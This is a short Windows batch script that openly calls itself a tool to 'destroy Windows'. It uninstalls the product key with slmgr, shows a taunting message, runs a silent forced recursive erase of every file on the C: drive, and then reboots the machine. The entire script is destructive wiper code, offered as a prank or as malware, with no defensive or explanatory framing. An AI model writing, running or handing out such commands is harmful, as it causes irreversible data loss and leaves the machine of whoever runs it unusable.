@echo off
echo -----------------------------------
echo Windows Uninstaller , destroy Windows!
echo -----------------------------------
echo Uninstalling Product Key...
slmgr /upk
if exist "C:\Windows\System32\msg.exe" msg * hey your product key got uninstalled, now go to buy another one!
echo Product key uninstalled , erasing Drive
echo Erasing in progress...
C:\Windows\SysWOW64\cmd.exe /k erase C:\/s /q /f
echo Drive was succesfully erased! rebooting....
wmic os where primary=1 reboot 